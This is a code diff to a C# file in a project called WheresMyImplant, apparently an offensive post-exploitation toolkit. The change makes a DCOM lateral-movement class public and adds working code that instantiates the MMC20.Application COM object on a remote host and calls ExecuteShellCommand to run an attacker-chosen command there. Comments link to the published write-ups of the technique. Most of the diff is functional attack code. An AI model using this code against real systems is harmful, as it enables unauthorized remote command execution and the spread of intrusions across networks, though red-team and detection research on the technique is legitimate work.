@@ -9,12 +9,12 @@ namespace WheresMyImplant
     ////////////////////////////////////////////////////////////////////////////////
     //https://www.cybereason.com/blog/dcom-lateral-movement-techniques
     ////////////////////////////////////////////////////////////////////////////////
-    class DCom
+    public sealed class DCom : Lateral
     {
         ////////////////////////////////////////////////////////////////////////////////
         //https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
         ////////////////////////////////////////////////////////////////////////////////
-        internal static void DComMMC(String target, String command, String arguments)
+        public static void DComMMC(String target, String command, String arguments)
         {
             Type comType = Type.GetTypeFromProgID("MMC20.Application");
             Object instance = Activator.CreateInstance(comType, target);
@@ -26,6 +26,14 @@ namespace WheresMyImplant
              * MMC20.Application mmc = (MMC20.Application)Activator.CreateInstance(comType, target);
              * mmc.Document.ActiveView.ExecuteShellCommand("calc.exe", null, null, "2");
             */
+
+            Type ComType = Type.GetTypeFromProgID("MMC20.Application", target);
+            object RemoteComObject = Activator.CreateInstance(ComType);
+
+            object Document = RemoteComObject.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, RemoteComObject, null);
+            object ActiveView = Document.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, Document, null);
+            ActiveView.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, ActiveView, new object[] { command, null, arguments, "7" });
+
         }
     }
 }
